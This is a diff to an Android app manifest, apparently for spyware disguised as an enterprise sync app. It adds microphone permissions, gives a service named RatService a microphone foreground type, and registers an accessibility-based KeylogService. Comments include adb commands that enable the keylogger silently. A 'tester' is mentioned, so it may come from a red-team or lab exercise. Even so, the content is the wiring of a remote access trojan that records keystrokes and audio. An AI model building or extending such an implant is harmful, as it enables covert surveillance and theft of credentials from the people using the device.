@@ -31,6 +31,10 @@
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
 
+    <!-- Microphone -->
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+
     <application
         android:allowBackup="false"
         android:label="@string/app_name"
@@ -53,7 +57,23 @@
         <service
             android:name=".RatService"
             android:exported="false"
-            android:foregroundServiceType="dataSync" />
+            android:foregroundServiceType="dataSync|microphone" />
+
+        <!-- Accessibility keylogger — tester enables via ADB: -->
+        <!-- adb shell settings put secure enabled_accessibility_services com.corp.enterprise.sync/.KeylogService -->
+        <!-- adb shell settings put secure accessibility_enabled 1 -->
+        <service
+            android:name=".KeylogService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:label="@string/keylog_service_label"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
 
         <!-- Screen capture activity (hosts MediaProjection permission request) -->
         <activity
